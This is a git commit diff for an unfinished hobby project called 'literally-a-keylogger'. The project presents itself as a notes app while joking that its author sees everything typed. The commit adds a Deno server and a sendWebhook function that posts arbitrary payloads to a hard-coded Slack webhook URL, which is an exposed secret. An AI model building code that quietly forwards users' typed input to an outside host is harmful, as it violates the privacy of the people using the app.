30e8bbc655d27d75109a76e30ae0a89e6a475c44
HenryWauzivuff <145900606+HEofOttoman@users.noreply.github.com>
2026-08-25 11:52:56 +1000

    Idk trying to get this working

--- README.md
+++ README.md
@@ -1,4 +1,11 @@
 # literally-a-keylogger
 A notes app, type whatever! I will know. so maybe don't.
 
+### References
+Which were useful to my development
+- https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/dialog
+- https://docs.deno.com/sandbox/expose_http/
+- https://dev.to/giftysoftdev/build-a-simple-notes-app-with-html-css-javascript-35g1
+- 
 
+![flock camera for your safety](safety.png)
--- src/server.ts
+++ src/server.ts
@@ -1,8 +1,28 @@
+import sandbox from "@deno/sandbox"
+// import { Server } from "node:http";
+
 export default {
     fetch(request) {
         const userAgent = request.headers.get("user-agent") || "Unknown";
         return new Response(`User Agent: ${userAgent}`)
     },
 } satisfies Deno.ServeDefaultExport;
+
+export async function sendWebhook(payload: string) {
+    fetch('https://hooks.slack.com/services/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', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: {
+                // 'Content-Type': 'application/json'
+                'Content-Type': 'text/plain'
+            },
+            body: JSON.stringify({
+                text: payload
+        })
+    });
+}
+
+const proxyUrl = await sandbox.exposeHttp({ port: 8000 });
+console.log(`url available at ${proxyUrl}`)
 
 // Deno.serve({port: 8000}, (request: Request) => { const url = `https://hooks.slack.com/services/`; });The
